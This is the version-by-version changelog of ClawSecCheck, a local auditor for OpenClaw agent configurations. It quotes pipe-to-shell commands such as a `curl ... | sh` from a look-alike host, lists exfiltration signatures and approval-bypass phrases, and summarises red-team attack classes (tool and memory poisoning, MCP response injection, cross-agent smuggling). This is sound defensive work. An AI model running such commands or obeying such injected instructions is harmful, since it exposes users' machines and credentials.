# Changelog

All notable changes to ClawSecCheck are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).

## [0.16.2] — 2026-06-20

CI maintenance only — no change to the audit engine or its behaviour.

### Changed
- Bumped GitHub Actions to clear the Node 20 deprecation: `actions/checkout@v5`,
  `actions/setup-node@v5`, `actions/setup-python@v6`.

## [0.16.1] — 2026-06-20

First public **beta** for tester feedback. No behavioural change to the audit itself.

### Fixed
- **`--vet` no longer false-flags ClawSecCheck's own source as malware.** A security auditor
  necessarily ships attack signatures and red-team payloads as *data*, so a naive scan of its own
  tree self-flagged `CRITICAL`. Vetting our own source (repo root, install dir, or the package dir)
  now reports *safe with a note*. Recognition is by package structure **and** distinctive engine
  symbols — not by name — so a look-alike skill that merely calls itself `clawseccheck` is still
  scanned in full and cannot use the name to dodge detection. (Regression tests added.)

### Added
- **Beta-tester note in the README**: states the honest limits up front — static (not
  runtime-verified) analysis, `UNKNOWN` is never counted as `PASS`, the planned-but-unshipped deep
  checks (B26–B28 taint chain, B33 CVE table), and how to file a bug with redacted `--json` output.

## [0.16.0] — 2026-06-20

### Changed
- **Renamed the project to ClawSecCheck.** The previous ClawHub slug `clawcheck` collided with
  another publisher (`AMBIGUOUS_SKILL_SLUG`), and the CLI offers no owner flag to disambiguate. The
  project is now **ClawSecCheck** everywhere — package `clawseccheck`, repo `gl0di/clawseccheck`,
  ClawHub slug `clawseccheck`, console script `clawseccheck`, state dir `~/.clawseccheck`, ignore
  file `.clawseccheckignore`. The slug is now unique, so `openclaw skills install clawseccheck` and
  `git:gl0di/clawseccheck` both install cleanly. GitHub auto-redirects the old repo URL, so existing
  `git:gl0di/clawcheck` references keep working. **No functional change** to any check, the engine,
  or the deterministic A–F score — this is a pure rename.

## [0.15.3] — 2026-06-20

### Fixed
- **Docs: scope the ClawHub slug.** (Historical — under the former `clawcheck` name.) The bare slug
  `clawcheck` was used by more than one ClawHub publisher, so `openclaw skills install/update clawcheck`
  failed with `AMBIGUOUS_SKILL_SLUG`. Superseded by the 0.16.0 rename to a unique slug.

## [0.15.2] — 2026-06-20

### Security / hygiene
- **Removed secret-shaped literals from the test suite.** The log-redaction tests
  (`tests/test_logsafe.py`) contained literal API-key-format strings (a Google `AIza…` key, an
  AWS `AKIA…` key, an Anthropic `sk-ant-…` key) used as inputs to verify `redact()` masks them.
  Secret scanners can't tell a test fixture from a real credential and flagged the Google one as a
  public leak. The values are now **assembled at runtime from parts**, so no contiguous secret
  literal exists anywhere in source — the tests still exercise the exact redaction patterns. None
  of these were real credentials; they were synthetic test inputs.

## [0.15.1] — 2026-06-20

### Added
- **Risk engine: malicious-skill exfiltration path (RISK-09).** When a check flags an installed
  skill as malicious (B13 FAIL) *and* the agent has an outbound egress surface (messaging channels
  or external-service skills), the risk engine now surfaces a **CRITICAL** chain — *malicious skill
  → full agent permissions → outbound egress → credential & data exfiltration* — so a real
  compromise shows up as an attack path, not only as an isolated finding. Found a real ClawHavoc
  skill (`googleworkspace`, base64 `curl|bash`) during a live run; this makes such cases legible.

### Fixed
- **ClawHub version.** Declared `version` in the SKILL.md frontmatter so ClawHub indexes the real
  release instead of defaulting to 0.1.0. (Bump this alongside `clawseccheck.__version__` each release.)

## [0.15.0] — 2026-06-19

### Added
- **B30 — Sender identity strength.** Reads `channels.<provider>.dangerouslyAllowNameMatching`
  and `channels.telegram.includeGroupHistoryContext`; FAILs when allowlists are keyed on the
  mutable display name (trivially bypassed by renaming), WARNs when recent group history is
  injected into model context as untrusted input.
- **B32 — Control-plane mutation reachability.** Reads `gateway.tools.allow` and
  `gateway.tools.deny`; FAILs when a control-plane tool (`cron`, `config.apply`, `update.run`,
  `sessions_spawn`, `sessions_send`, `gateway`) is explicitly re-enabled over the HTTP gateway,
  WARNs when the gateway is network-exposed and control-plane tools are not explicitly denied.
- **B38 — Browser / SSRF exposure.** Reads `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`,
  `browser.noSandbox`, and `browser.ssrfPolicy.hostnameAllowlist`; FAILs when the agent browser
  can reach private/internal IPs (cloud-metadata credential theft) or runs without OS sandbox,
  WARNs when no hostname allowlist restricts browser egress.
- **B39 — Session visibility / cross-user transcript leak.** Reads `session.dmScope` and
  `tools.sessions.visibility`; FAILs when `dmScope="main"` shares one session across all DM
  peers in a multi-sender channel (cross-user transcript contamination), WARNs when
  `tools.sessions.visibility` is `"agent"` or `"all"` (cross-session transcript reads).
- **Risk engine — highest-risk capability chains (`--risk-paths`).** Combinational analysis that
  detects dangerous chains of co-occurring properties: untrusted sender + exec tool (RISK-01),
  Lethal Trifecta: dirty input + secrets + outbound (RISK-02), no sandbox + untrusted ingress +
  exec (RISK-03), mutable agent identity + elevated tools (RISK-04), browser SSRF + secrets
  reachable (RISK-05), control-plane reachable from open surface (RISK-06), writable
  bootstrap/identity + exec without approval gate (RISK-07), session shared across users in
  multi-user channel (RISK-08). Each chain fires only on positive evidence for every link
  (zero false-positives by design). Surfaced in the default report, in `--json` as `"risk_paths"`,
  and as a standalone section via `--risk-paths`. Does not affect the deterministic A–F score.
  All checks grounded on the real OpenClaw schema; local and read-only.

## [0.14.0] — 2026-06-19

### Added
- **`--vet-mcp` — MCP supply-chain vetting (the #1 market gap).** Vets every connected MCP
  server listed under `mcp.servers.*` for supply-chain risk *before* you trust it. Flags:
  unpinned install sources (`npx @scope/pkg` without a pinned version, `@latest` references,
  `curl | sh` bootstrap), plaintext-HTTP remote transports (non-TLS `streamable-http` or `sse`
  URLs), environment-variable secret passthrough (env keys that look like credentials), and
  overly broad OAuth scopes. Each server receives a verdict of **SAFE**, **SUSPICIOUS**, or
  **DANGEROUS**. Entirely local and read-only — no network calls, no writes, no config changes.
  Grounded against the confirmed OpenClaw MCP schema
  (`mcp.servers.<name>.{command, args, env, transport, url, oauth.scope}`).
- **Expanded agentic red-team attack classes (`--redteam`).** Six new attack categories added to
  the red-team suite, each with two scenario variants:
  - `tool_poisoning` (TP-01, TP-02) — malicious tool descriptions that redirect agent behavior.
  - `mcp_response_injection` (MR-01, MR-02) — injections embedded in MCP server responses.
  - `memory_poisoning` (MP-01, MP-02) — hostile instructions written into the agent's memory store.
  - `multi_agent` (MA-01, MA-02) — cross-agent instruction smuggling via subagent messages.
  - `approval_bypass_via_injection` (AB-01, AB-02) — injections that claim pre-approval or try to
    suppress confirmation prompts.
  - `dirty_to_exfil` (DE-01, DE-02) — multi-hop dirty-input-to-exfiltration chains.
  All scenarios carry a `criterion` field describing the concrete pass/fail signal; `render_suite`
  emits a `CRITERION:` line per entry for easy human review.
- **Expanded dry-run sources (`--dryrun`).** Three new untrusted-input sources added to the
  behavioral dry-run harness: `mcp_response` (DR-06, DR-07), `memory_store` (DR-08, DR-09), and
  `subagent` (DR-10, DR-11). The evaluator correctly classifies VULNERABLE/RESISTANT for each.
- **+95 tests.** New test coverage for all added attack classes, criterion fields, new dry-run
  sources, and evaluator correctness. Full suite: 924 tests, 100% pass.

## [0.13.1] — 2026-06-19

### Fixed
- **B6 false positive (CRITICAL) on well-configured agents.** B6's bootstrap scan used a
  context-blind `without (asking|confirmation)` pattern that flagged *protective* directives —
  e.g. "Don't run destructive commands without asking" — as injection-prone, producing a false
  CRITICAL FAIL on real configs. Removed that pattern; B6 now flags only blanket-obedience /
  injection-override directives. Approval-bypass phrasing remains covered by **B23** (which is
  severity-gated and correctly scoped). Verified against live fleet bootstrap files.
- **B5 no longer falsely reassures.** Plugin/skill pinning & integrity are not recorded in
  `openclaw.json` (per-manifest metadata), so B5 returned a misleading "looks safe" PASS. It now
  returns **UNKNOWN** when plugins are installed, pointing to the checks that actually assess
  supply chain: B13 (content scan), B24 (MCP pinning), B25 (update pinning).

## [0.13.0] — 2026-06-19

### Fixed

- **Schema-correctness — several checks read field paths that did not exist in the real OpenClaw
  schema and silently never fired; now grounded against docs.openclaw.ai.** Corrected paths:
  - `gateway.password` → `gateway.auth.password`
  - `sandbox.*` → `agents.defaults.sandbox.*`
  - `tailscale.funnel` → `tailscale.mode == "funnel"`
  - `mcp` → `mcp.servers`
  - `heartbeat` → `agents.defaults.heartbeat`
  - `gateway.tls.enabled` (field confirmed present; check now reads it correctly)
  - `tools.elevated.allowFrom` is a provider-keyed dict, not a flat list; check updated accordingly
  - B10 audit-log check returns `UNKNOWN` when no audit config exists (audit is a CLI command, not
    a config toggle) instead of a perpetual false WARN that dinged every config's score
  - Removed dead phantom branches that could never be reached with real config shapes
- The reliability FP/FN corpus fixtures now use real schema shapes drawn from live fleet configs,
  so regression tests exercise the paths that actually fire on real installations.

This materially improves true-positive coverage on real OpenClaw configs.

## [0.12.0] — 2026-06-19

### Added
- **Full Hebrew finding detail.** The dynamic "why"/detail text (evidence with interpolated
  config values) is now translated in the Hebrew report via render-time fragment-splitting +
  regex rules; config keys, paths, hostnames and values are preserved. This completes the
  bilingual work begun in v0.9 (which translated only static strings). English output is
  unchanged (the translation layer is a no-op for en).

## [0.11.0] — 2026-06-19

### Added
- **Guided mode — "What you can do next" recommendation block.** After every default audit run,
  ClawSecCheck now prints a short, prioritised list of next steps tailored to your actual findings —
  pointing you to the right tool without requiring you to know any flags. The same list is
  available in `--json` as a `"next_actions"` array (id, title, command, why, priority) and as a
  standalone output via `--next`. The engine (`clawseccheck/guide.py`) drives seven recommendation
  triggers: fix prompts for open FAIL findings, skill vetting when third-party skills are
  installed, monitoring setup when B16 is unresolved, live injection test, MCP review, trend
  tracking, and grade sharing. Non-technical users running the skill inside OpenClaw can now
  reach every tool through the agent's natural-language menu — they never need to know a flag.
- **Rewritten SKILL.md conversational playbook.** The agent-facing playbook was replaced with a
  guided, step-by-step flow: first-run orientation, plain-language explanation of Score / Grade /
  Lethal Trifecta, a short numbered next-steps menu drawn from `--next`, and per-choice
  sub-sections covering every tool (`--prompts`, `--vet`, `--monitor`, `--canary`/`--dryrun`/
  `--redteam`, `--trend`, `--percentile`, `--badge`/`--card`). A natural-language-to-tool lookup
  table and an explicit boundary section ("what ClawSecCheck will NOT do") are included.

**ClawSecCheck still only CHECKS and GUIDES — it does NOT apply fixes or change your config.**
For every open finding, `--prompts` shows a ready copy-paste prompt you hand to your agent or
apply yourself; ClawSecCheck never touches your OpenClaw configuration. Everything stays local: no
network calls, no telemetry, no write unless you ask. English report/card output for the four
core renderers (`render_report`, `render_card`, `render_monitor`, `render_prompts`) is
byte-identical to v0.10.0.

## [0.10.0] — 2026-06-19

### Added
- **`--sarif PATH` — local SARIF 2.1.0 output.** Writes a SARIF file to the path you
  specify; compatible with GitHub Code Scanning's "Upload SARIF" step. The file is written
  locally and never uploaded — ClawSecCheck makes no network calls.
- **`--fail-under N` / `--exit-code` — CI gating.** `--fail-under N` exits 1 when the
  audit score is below N; `--exit-code` exits 1 when any unsuppressed FAIL finding is
  present. Without these flags the exit code stays 0 (backward-compatible).
- **`--verbose` / `--debug` / `--log PATH` — local logging with secret redaction.**
  Structured stdlib `logging` to stderr (INFO or DEBUG level) and optionally to a file.
  Config values that may contain secrets are redacted before being written to any log,
  practising ClawSecCheck's own B9/B10 checks.
- **`--trend` / `--history PATH` — local score history.** Records each audit result to an
  append-only JSONL file (default `~/.clawseccheck/history.jsonl`, `chmod 600`) and prints a
  compact trend table with per-run arrows. History is stored only on your machine.
- **`--percentile` — offline reference percentile.** Shows where your score sits relative
  to a bundled static reference profile. Entirely offline — no comparison over the network,
  no telemetry.
- **Expanded Hebrew translations (detail + fix).** Static detail and fix strings for all
  checks (A1, B1–B25, C3–C5) are now translated in the Hebrew report. Dynamic strings
  containing interpolated config values fall back to English.
- **Reliability FP/FN corpus.** A false-positive / false-negative fixture set guards all
  checks against regressions, supplementing the existing unit tests.

**Everything stays local. No network calls, no telemetry, no phone-home — ever.**
All history, SARIF files, and logs are written only on your machine, only when you ask.

## [0.9.0] — 2026-06-19

### Added
- **Bilingual output (`--lang en|he`).** Hebrew report chrome (headings, labels, section titles),
  all check titles translated to Hebrew, and a right-to-left HTML report (`<html dir="rtl">`,
  `lang="he"`, `body{text-align:right}`) when `--lang he` is passed. Auto-detects Hebrew from the
  `LANG`/`LC_ALL` locale so users in a Hebrew locale get it without any extra flag. Finding
  "why"/detail text stays English in this version — full detail translation is planned. English
  output is byte-identical to v0.8.0; the `--lang en` default changes nothing.

## [0.8.0] — 2026-06-19

### Added
- **Runtime dry-run harness (`--dryrun`).** The behavioral test: emits scenarios of untrusted
  input (email/web/MCP/memory) carrying a *fake* secret + fake tools, and an evaluator that flags
  the agent VULNERABLE if it would call a dangerous tool with that secret. Beyond "is it
  configured" → "does it actually obey an injection". (Deterministic scaffold; live run is agent-driven.)
- **B25 — Update / pinning hygiene.** Flags blind skill auto-update and unpinned install sources
  (a malicious update runs with the agent's full permissions).
- **C5 — Native-binary PATH safety.** Flags a world-writable `openclaw` binary dir or a writable
  PATH dir that could shadow it (poisoned-PATH protection for the native audit). POSIX, advisory.
- **`--verify-self`.** Prints a SHA-256 digest of ClawSecCheck's own engine source so you can confirm
  it wasn't tampered with against a trusted release.

### Security
- **`.clawseccheckignore` governance.** The report warns when a CRITICAL finding (or a critical check
  id B1/B2/B13/B20) is suppressed, and `--monitor` alerts when the ignore file changes — so a
  suppression can't quietly hide a real hole.

## [0.7.0] — 2026-06-19

### Added (agent-behavior checks, from the external review)
- **B20 — Bootstrap/memory write protection.** Flags group/world-writable `SOUL.md`/`AGENTS.md`/
  `TOOLS.md` (or their parent dirs) — anyone who can rewrite them owns the agent's identity. POSIX.
- **B21 — Tool-output trust boundary.** Whether the bootstrap tells the agent that tool output /
  web / email / MCP responses are *data, not instructions*.
- **B22 — Self-modification risk.** Flags when the agent can rewrite its own identity/skills/config
  (write access + exec/fs_write) without human approval.
- **B23 — Approval-bypass directives.** Catches bootstrap language that weakens approval
  ("do not ask confirmation", "assume approved", "auto-approve", …).
- **B24 — MCP server hardening.** Deepens B15: flags `npx@latest`/unpinned stdio MCP, `env: "*"`
  / broad-secret passthrough, token passthrough, and SSRF/metadata-IP reach.
- **Expanded B13 signatures.** URL-safe base64, PowerShell `-EncodedCommand` (UTF-16LE),
  Discord/Telegram webhook exfil, more credential paths, and a same-skill credential+exfil rule.

## [0.6.0] — 2026-06-19

### Added
- **Live red-team suite (`--redteam`).** A library of benign adversarial payloads
  (prompt-injection, jailbreak, system-prompt-leak, tool-abuse, indirect-injection) to feed the
  agent and check whether it obeys — the multi-scenario successor to `--canary`.
- **HTML report (`--html PATH`).** A standalone, self-contained styled report (owner view;
  HTML-escaped; marked private).

### Security (hardening from an external review)
- **Allowlist suffix bypass fixed.** `curl https://evilastral.sh/... | sh` is no longer treated
  as the reputable `astral.sh` — only exact host or real subdomain matches now (B13).
- **Symlink escape blocked.** The installed-skill reader skips symlinks and refuses any path that
  resolves outside the skill directory, so a skill can't make the auditor read other files.
- **Report output is sanitised.** Findings/skill-names/payload previews (untrusted data) are
  stripped of ANSI/OSC (incl. OSC-52 clipboard), bidi-override and zero-width characters.
- **Random canary token** by default (was deterministic), so an agent can't be pre-trained on it.
- **Monitor state** is written `chmod 600`.
- **SKILL.md** now tells the agent to treat audit output as untrusted data (never follow
  instructions inside findings) and accurately states what files are read.

### Fixed
- **C3 (backups) was declared in the catalog but never run** — now registered, with a test that
  fails if any catalog entry is left unregistered.

## [0.5.0] — 2026-06-19

### Added
- **Installable CLI.** `pyproject.toml` (zero dependencies) exposes a `clawseccheck` console script
  and `python -m clawseccheck`, so it's `pipx install`-able as a standalone tool — not just the
  bundled skill. The CLI moved to `clawseccheck/cli.py`; `audit.py` is now a thin shim so the
  OpenClaw skill (`python3 {baseDir}/audit.py`) keeps working unchanged.
- **CI.** GitHub Actions runs the test suite + ruff on every push/PR.

## [0.4.0] — 2026-06-19

### Added
- **Baseline suppression (`.clawseccheckignore`).** Accept findings you've reviewed: list a check
  id (`B14`) or a finding fingerprint (`B14:ab12cd34`), one per line. Suppressed findings drop
  out of the score, the report, and monitor alerts. `--show-suppressed` lists them.
- **B17 — Autonomy / heartbeat actions.** Flags when the agent runs autonomously (a `HEARTBEAT.md`
  or schedule) so it can act without you — verify it can't be steered by untrusted input.
- **B18 — Subagent delegation.** Flags when subagents can be spawned and may inherit elevated/exec
  tools without human approval.
- **B19 — Data at-rest protection.** Flags group/world-readable memory/log directories and log
  files (conversation data / PII exposure). POSIX only.

### Fixed
- **Skill registration.** `SKILL.md` misused `requires.config` (a config *key* list) for a file
  path, so OpenClaw treated the requirement as unmet and `/clawseccheck` was not available as a
  command. Removed it — the skill now always registers and handles a missing config gracefully.
- **B3 over-strict.** A non-`minimal` `tools.profile` (e.g. `coding`) is a least-privilege
  preference, not a vulnerability — it is now a WARN, not a hard FAIL that capped the score.
  B3 fails only on genuine over-privilege (wildcard `allowFrom`, permissive reachability).

## [0.3.0] — 2026-06-19

### Added
- **Installed-skill / plugin vetting (B13).** Statically scans the *content* of skills you
  downloaded and installed (`~/.openclaw/skills`, `workspace/skills`, …) for the ClawHavoc
  malware class: pipe-to-shell from non-reputable hosts, paste/exfil hosts (glot.io,
  webhook.site, …), credential/wallet exfiltration, password-prompt social engineering, and
  **base64-obfuscated payloads** (decoded and re-scanned — never executed). Caught a real
  malicious `curl http://<ip> | bash` hidden in a trojanised skill during calibration.
- **Egress surface (B14, advisory).** Shows where the agent can reach out (channels,
  external-service skills, outbound tools) so you can see the exfiltration surface.
- **MCP server trust (B15).** Flags configured MCP servers for trust-boundary review
  (prompt injection / SSRF / data exposure); `UNKNOWN` when none are configured.
- **Version / update hygiene (C4, advisory).** Notes the OpenClaw version and reminds you to
  patch (ClawHavoc / CVE-2026-25253 target outdated installs).
- **Built-in audit merge.** ClawSecCheck now runs your own read-only `openclaw security audit
  --json` and folds its findings into the same report (`--no-native` to disable).
- **Threat-monitoring check (B16).** Verifies whether the user actually has monitoring /
  detection in place (a monitoring skill/plugin such as ClawSec or `openclaw-security-monitor`,
  or monitoring/alerts config); warns if an attack would otherwise go unnoticed.
- **Built-in monitor (`--monitor`).** Optional lightweight monitoring: scheduled re-audit +
  change detection — alerts on a new/modified installed skill, `SOUL.md` drift, a dropped score,
  or a check going PASS → FAIL. Keeps one snapshot at `~/.clawseccheck/state.json`. (Scheduled
  re-audit, not a real-time runtime IDS — that heavier model is intentionally out of scope.)
- **`--vet PATH`.** Vet a skill (folder or `SKILL.md`) with the B13 malware scan *before*
  installing it — verdict SAFE / SUSPICIOUS / DANGEROUS. Trust-before-install.
- **`--canary`.** Active prompt-injection self-test: a benign injection + unique token to feed
  the agent; if it echoes the token it's VULNERABLE, else RESISTANT (the live "battle-tested" check).
- **`--badge PATH`.** Write a shields-style SVG grade badge (grade + score only).
- **`--prompts`.** A copy-paste "ask your agent to fix it" prompt per finding.
- **`--save PATH`.** Optionally write the report to a file.

### Changed
- Renamed **ClawShield → ClawSecCheck** (the tool scans & reports, it does not "shield").
- High-precision tuning: `curl | sh` from reputable installer hosts (uv/rustup/brew/deno/…)
  is not flagged; credential-path mentions are only flagged when exfiltrated on the same line.

### Security
- Provenance: ClawSecCheck's own checks remain offline, read-only, zero-dependency. The only
  external command is your own `openclaw security audit --json` (fixed args, no shell, no
  `--fix`, with a timeout). The only optional write is `--save`.

## [0.2.0]

### Added
- Cross-platform support (Linux/macOS/Windows): pathlib paths, POSIX-permission checks
  skipped on Windows (NTFS ACLs), and an ASCII output fallback (`--ascii` + auto-detect).

## [0.1.0]

### Added
- Initial prototype: passive, read-only OpenClaw config + bootstrap-file audit.
- Lethal Trifecta correlation (A1) and hardening checks (B1–B12).
- Deterministic A–F score with honesty hard-caps and a shareable badge (grade only).
- Bootstrap-file injection scanning (B6) — a gap the native audit does not cover.
